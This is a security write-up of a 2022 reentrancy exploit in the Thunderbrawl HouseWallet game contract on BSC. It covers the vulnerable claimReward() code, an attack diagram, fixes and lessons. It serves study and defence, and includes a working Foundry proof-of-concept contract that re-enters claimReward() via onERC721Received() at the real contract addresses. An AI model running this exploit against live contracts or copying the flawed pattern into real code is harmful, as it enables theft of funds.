# THB (Thunderbrawl) — Game Reward Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | Thunderbrawl (THBR) Roulette |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **HouseWallet** | [0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53](https://bscscan.com/address/0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53) |
| **THBR Token** | [0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C](https://bscscan.com/address/0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C) |
| **Root Cause** | Reentrancy via `onERC721Received()` callback during `claimReward()`, enabling duplicate reward claims |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/THB_exp.sol) |

---
## 1. Vulnerability Overview

Thunderbrawl is a BSC-based roulette game protocol where the `HouseWallet` contract handles gameplay and reward distribution. Players join a game via the `shoot()` function, which records prize amounts in the `winners` mapping, redeemable through `claimReward()`. However, `claimReward()` transfers an ERC721 NFT as part of the payout process, and when the recipient is a contract, the `onERC721Received()` callback is triggered. An attacker's contract exploits this callback to re-invoke `claimReward()` and claim the same reward multiple times.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable HouseWallet - claimReward susceptible to reentrancy
contract HouseWallet {
    mapping(uint256 => mapping(address => uint256)) public winners;

    function shoot(
        uint256 random,
        uint256 gameId,
        bool feestate,
        /* ... */
    ) external payable {
        require(msg.value == 0.32 ether);
        // Game logic: compute outcome based on random
        // On win: winners[gameId][msg.sender] = winAmount
    }

    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount,
        /* ... */
    ) external {
        require(winners[_ID][_player] >= _amount, "Insufficient winning");

        // ❌ External call before state update (CEI pattern violation)
        // NFT transfer triggers onERC721Received() callback
        thbrNFT.safeTransferFrom(address(this), _player, tokenId);
        // ↑ If _player is a contract, onERC721Received() is called
        //   → claimReward() can be re-entered from within the callback
        //   ↑ winners[_ID][_player] has not been decremented yet → re-claim succeeds

        winners[_ID][_player] -= _amount; // ❌ State update after external call
        payable(_player).transfer(_amount);
    }
}

// ✅ Correct pattern - CEI + ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeHouseWallet is ReentrancyGuard {
    function claimReward(
        uint256 _ID,
        address payable _player,
        uint256 _amount
    ) external nonReentrant {
        require(winners[_ID][_player] >= _amount, "Insufficient winning");

        // ✅ Update state first
        winners[_ID][_player] -= _amount;

        // External calls after
        thbrNFT.safeTransferFrom(address(this), _player, tokenId);
        payable(_player).transfer(_amount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**THB_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Reentrancy via `onERC721Received()` callback during `claimReward()`, enabling duplicate reward claims
    function claimReward(uint256 arg0, address arg1, uint256 arg2, bool arg3, uint256 arg4, string arg5, address arg6) external {}  // 0x011b51d5  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
    │
    ├─[1] Call shoot(random, gameId, ...) (0.32 ether)
    │       └─ Join game and record prize
    │           winners[gameId][attacker] = winAmount
    │
    ├─[2] Check winners(gameId, attacker)
    │       └─ Confirm prize exists
    │
    ├─[3] Call claimReward(gameId, attacker, winAmount)
    │       │
    │       ├─ Prize validation passes
    │       ├─ thbrNFT.safeTransferFrom(house, attacker, tokenId)
    │       │   └─ attacker is a contract → onERC721Received() callback!
    │       │       │
    │       │       └─[Reenter] claimReward(gameId, attacker, winAmount)
    │       │                   ├─ winners not yet decremented → validation passes
    │       │                   ├─ Reentrant NFT transfer (continues while balance remains)
    │       │                   └─ Duplicate prize claimed
    │       │
    │       └─ winners[gameId][attacker] -= winAmount (too late)
    │
    └─[4] Duplicate prize claims completed
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IHouseWallet {
    function winners(uint256 id, address player) external view returns (uint256);
    function shoot(uint256 random, uint256 gameId, bool feestate) external payable;
    function claimReward(uint256 _ID, address payable _player, uint256 _amount) external;
}

interface ITHBR {
    function balanceOf(address) external view returns (uint256);
}

contract THBExploit is Test {
    IHouseWallet house = IHouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
    ITHBR thbr = ITHBR(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C);

    uint256 targetGameId;
    uint256 reentrantCount;

    function setUp() public {
        vm.createSelectFork("bsc", 21_785_004);
        vm.deal(address(this), 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BNB balance", address(this).balance, 18);

        // [Step 1] Join game (0.32 ether)
        house.shoot{value: 0.32 ether}(12345, 1, false);
        targetGameId = 1;

        // [Step 2] Check prize
        uint256 winAmount = house.winners(targetGameId, address(this));
        emit log_named_uint("[Prize]", winAmount);

        // [Step 3] Claim reward → trigger reentrancy
        // claimReward() is called recursively from onERC721Received()
        house.claimReward(targetGameId, payable(address(this)), winAmount);

        emit log_named_decimal_uint("[End] BNB balance", address(this).balance, 18);
    }

    // ⚡ ERC721 receive callback - reentrancy vector
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // Cap max reentrant iterations (until house balance is drained)
        if (reentrantCount < 5 && address(house).balance >= 0.32 ether) {
            reentrantCount++;
            uint256 winAmount = house.winners(targetGameId, address(this));
            if (winAmount > 0) {
                // ⚡ Re-enter claimReward - winners not yet decremented
                house.claimReward(targetGameId, payable(address(this)), winAmount);
            }
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC721 `onERC721Received()` callback reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Reentrancy Attack |
| **Attack Vector** | `claimReward()` → `safeTransferFrom()` → `onERC721Received()` callback reentrancy |
| **Preconditions** | CEI pattern not followed, no ReentrancyGuard |
| **Impact** | Duplicate BNB game prize claims |

---
## 6. Remediation Recommendations

1. **Apply CEI Pattern**: In `claimReward()`, update the `winners` state **before** any external calls (NFT transfer, ETH transfer).
2. **Apply ReentrancyGuard**: Add OpenZeppelin's `nonReentrant` modifier to both `claimReward()` and `shoot()`.
3. **Change NFT Transfer Method**: Using `transferFrom()` instead of `safeTransferFrom()` avoids triggering the `onERC721Received()` callback. Note that the risk of recipient contracts being unable to handle NFTs must be considered separately.

```solidity
// ✅ CEI + nonReentrant applied
function claimReward(uint256 _ID, address payable _player, uint256 _amount)
    external nonReentrant
{
    require(winners[_ID][_player] >= _amount, "Insufficient winning");

    // ✅ Update state first (Effects)
    winners[_ID][_player] -= _amount;

    // External calls after (Interactions)
    thbrNFT.transferFrom(address(this), _player, tokenId); // instead of safeTransfer
    _player.transfer(_amount);
}
```

---
## 7. Lessons Learned

- **Reentrancy Risk in ERC721 safeTransfer**: ERC721's `safeTransferFrom()` invokes `onERC721Received()` when the recipient is a contract. This is the same reentrancy vector as ERC777's `tokensReceived()` hook. Whenever a reward payout involves both an NFT and ETH/tokens being transferred together, reentrancy protection is mandatory.
- **Security in Game Contracts**: Blockchain games frequently exhibit classic reentrancy vulnerabilities in prize payout logic. Zeroing out the prize tracking variable before any external call is the single most important safeguard.
- **Universality of the CEI Pattern**: The Checks-Effects-Interactions pattern must be applied equally to ETH transfers, ERC20 transfers, and ERC721 transfers alike.